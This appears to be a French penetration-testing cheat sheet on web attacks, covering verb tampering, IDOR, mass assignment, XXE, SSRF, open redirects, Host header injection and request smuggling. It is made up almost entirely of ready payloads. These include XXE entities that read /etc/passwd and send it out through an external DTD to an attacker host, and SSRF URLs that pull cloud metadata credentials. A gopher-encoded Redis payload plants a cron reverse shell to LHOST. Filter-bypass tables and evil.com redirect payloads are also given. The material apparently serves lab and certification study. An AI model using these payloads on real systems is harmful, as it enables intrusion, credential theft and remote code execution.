# 23 — Web Attacks

## Objectifs
Exploiter les failles applicatives classiques : HTTP verb tampering, IDOR, XXE, SSRF.

---

## 1. HTTP Verb Tampering

### Principe
Les contrôles d'accès sont souvent attachés à une méthode (`GET`, `POST`). Changer la méthode peut contourner l'auth.

```bash
# Découvrir les méthodes autorisées
curl -X OPTIONS -i http://<TARGET>/
nmap -p80 --script http-methods --script-args http-methods.test-all <TARGET>

# Tester
curl -X TRACE http://<TARGET>/
curl -X PUT http://<TARGET>/admin
curl -X DELETE http://<TARGET>/admin
curl -X PATCH http://<TARGET>/admin
curl -X HEAD http://<TARGET>/admin

# Bypass d'auth : endpoint protégé en GET
curl -X POST http://<TARGET>/admin -d "x=1"

# Header override
curl -H "X-HTTP-Method-Override: PUT" -X POST http://<TARGET>/admin
```

### Insecure Direct Object Reference (IDOR)

```bash
# Énumérer les IDs
for i in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -b "session=<S>" http://<TARGET>/api/user/$i)
  echo "$i $code"
done

# ffuf
ffuf -u http://<TARGET>/api/user/FUZZ -w ids.txt -H "Cookie: session=<S>" -mc 200 -fs 0

# Changer un paramètre
curl -b "session=<S>" "http://<TARGET>/profile?user_id=1"
curl -b "session=<S>" "http://<TARGET>/invoice/1001.pdf"

# ID encodé / hashé
curl "http://<TARGET>/file?f=MTIz"     # base64 de 123
curl "http://<TARGET>/doc?uuid=<UUID>"
```

### Mass assignment
```bash
# Ajouter des champs non prévus
curl -X POST http://<TARGET>/api/register -d '{"user":"x","pass":"y","role":"admin"}'
curl -X PATCH http://<TARGET>/api/profile -d '{"email":"x@y.z","isAdmin":true}'
```

---

## 2. XXE (XML External Entity)

### Détection
```bash
# Envoyer du XML
curl -X POST http://<TARGET>/api -H "Content-Type: application/xml" -d '<root><name>test</name></root>'

# Vérifier si les entités sont interprétées
curl -X POST http://<TARGET>/api -H "Content-Type: application/xml" \
  -d '<!DOCTYPE r [<!ENTITY t "hello">]><r>&t;</r>'
```

### Lecture de fichiers
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<r>&xxe;</r>
```

```xml
<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

### SSRF via XXE
```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://<LHOST>:8000/">]>
<r>&xxe;</r>
```

### Blind XXE — OOB
```xml
<!-- exfil direct -->
<!DOCTYPE r [<!ENTITY % x SYSTEM "http://<LHOST>:8000/evil.dtd"> %x;]>
```
```xml
<!-- evil.dtd -->
<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % p "<!ENTITY send SYSTEM 'http://<LHOST>:8000/?d=%f;'>">
%p;
```
```xml
<!-- erreur locale -->
<!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd"> %f;]>
```

### PHP expect
```xml
<!ENTITY xxe SYSTEM "expect://id">
```

### Outils
```bash
# Serveur DTD
python3 -m http.server 8000
# Listener
nc -lvnp 8000
```

---

## 3. SSRF (Server-Side Request Forgery)

### Détection
```bash
# Paramètre qui fetch une URL
?url=http://<LHOST>:8000/
?image=http://<LHOST>:8000/x.png
?webhook=http://<LHOST>:8000/
?proxy=http://<LHOST>:8000/
```

```bash
# Listener
python3 -m http.server 8000
# Ou
nc -lvnp 8000
```

### Accès aux services internes
```bash
?url=http://127.0.0.1/
?url=http://127.0.0.1:22
?url=http://127.0.0.1:3306
?url=http://localhost:8080/admin
?url=http://169.254.169.254/latest/meta-data/       # AWS metadata
?url=http://metadata.google.internal/computeMetadata/v1/  # GCP
```

### Protocoles
```bash
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info
?url=gopher://127.0.0.1:6379/_INFO
?url=sftp://127.0.0.1:22/
```

### Gopher → Redis (RCE)
```bash
# Payload gopher (URL-encodé)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A*/ * * * * bash -i >& /dev/tcp/LHOST/4444 0>&1%0A%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

### Contournement de filtres
| Filtre | Bypass |
|---|---|
| `127.0.0.1` bloqué | `localhost`, `127.1`, `0.0.0.0`, `[::1]`, `2130706433`, `0177.0.0.1` |
| `localhost` bloqué | `127.0.0.1`, décimal |
| `http` bloqué | `file://`, `gopher://`, `dict://` |
| URL externe bloquée | redirection sur notre serveur → `302` vers `http://127.0.0.1` |
| DNS rebinding | domaine contrôlé qui résout vers 127.0.0.1 |

```bash
# Redirection
# Sur <LHOST>/redir : 302 Location: http://127.0.0.1/admin
python3 -c "from http.server import *; ..."
# ou utiliser un service de redirection
?url=http://<LHOST>/redir
```

### SSRF vers RCE
- Redis (gopher) → cron / webshell
- Elasticsearch / Docker API
- FastCGI (gopher)
- AWS metadata → clés IAM

---

## 4. Autres attaques web

### Open Redirect
```bash
?next=https://evil.com
?redirect=//evil.com
?url=https://<TARGET>@evil.com
```

### Host header injection
```bash
curl -H "Host: evil.com" http://<TARGET>/reset
curl -H "X-Forwarded-Host: evil.com" http://<TARGET>/reset
```

### HTTP request smuggling (lab)
```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

---

## Checklist
- [ ] Méthodes HTTP testées (`OPTIONS`, `PUT`, `TRACE`)
- [ ] IDs énumérés (IDOR horizontal/vertical)
- [ ] Champs mass assignment testés
- [ ] XML accepté et entités testées
- [ ] SSRF : URL internes, protocoles, métadonnées
- [ ] Filtres contournés (redirection, encodages)
- [ ] Impact démontré (données, RCE)

## Tableau récapitulatif
| Attaque | Payload clé |
|---|---|
| Verb tampering | `-X PUT`, `X-HTTP-Method-Override` |
| IDOR | changer `id=`, `user_id=` |
| XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| Blind XXE | DTD externe + exfil HTTP |
| SSRF | `url=http://127.0.0.1:port` |
| SSRF bypass | `127.1`, `[::1]`, gopher |
